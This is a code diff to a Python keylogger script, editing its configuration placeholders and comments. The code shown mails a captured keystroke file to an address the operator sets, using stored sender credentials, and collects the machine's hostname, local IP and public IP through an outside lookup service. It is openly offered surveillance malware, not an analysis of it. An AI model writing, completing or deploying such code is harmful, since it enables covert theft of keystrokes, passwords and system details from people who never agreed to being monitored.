@@ -41,11 +41,11 @@ microphone_time = #input a number
 time_iteration =  #input a number
 number_of_iterations_end =  #input a number
 
-fromaddr = "# sender_mail"
-password = "# sender_mail_password"
-toaddr = "# receiver_mail"
+fromaddr = "" # sender_mail
+password = "" # sender_mail_password
+toaddr = "" # receiver_mail
 
-file_path = "# File_path of where your project file get stored"
+file_path = "" # File_path of where your project file get stored
 extend = "\\"
 file_merge = file_path + extend
 key = "Encryption key"
@@ -65,7 +65,7 @@ def send_mail(filename ,attachment, toaddr):
     msg['To'] = toaddr 
   
 # storing the subject  
-    msg['Subject'] = "Key_logger updated from #1 device"
+    msg['Subject'] = "" #Write a subject for the email(You can add time too)
   
 # string to store the body of the mail 
     body = "Content is attached below!"
@@ -107,9 +107,7 @@ def send_mail(filename ,attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text) 
   
 # terminating the session 
-    s.quit() 
-
-#helllo neww world New world again about to send the legal news  
+    s.quit()   
 
 send_mail(keys_info,file_path + extend + keys_info,toaddr)
     
@@ -118,7 +116,7 @@ def computer_information():
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
 
-#try and except used to prevent in case of error occurs and ruins the code
+#try and except used to prevent in case of error occurs, It may stop the code from running
         try:
             public_ip = get("https://api.ipify.org").text
             f.write("Public IP Address: " + public_ip)
